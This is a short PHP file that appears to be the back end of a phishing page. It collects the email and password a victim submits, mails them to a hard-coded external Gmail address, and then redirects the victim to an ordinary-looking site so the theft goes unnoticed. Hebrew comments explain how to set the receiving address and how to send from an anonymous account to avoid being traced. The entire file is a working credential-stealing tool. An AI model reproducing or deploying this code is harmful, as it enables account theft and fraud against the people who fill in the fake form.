<?php

$to      = 'thrapsd@gmail.com';     /// כאן יש להזין את כתובת המייל שיקבל את הפרטים שמשתמש יזין - כדאי שיהיה שונה מהמייל האנונימי
$subject = 'the subject';
$message = $_POST["email"] . "  :  " . $_POST["pass"];
$headers = 'From: webmaster@example.com' . "\r\n" .   // כאן יש להזין את כתובת השולח מממייל אנונימי
    'Reply-To: webmaster@example.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

mail($to, $subject, $message, $headers);


$newURL = "https://www.somesite.com/";  //קישור לתיקיה הראשית
header('Location: '.$newURL);
?>
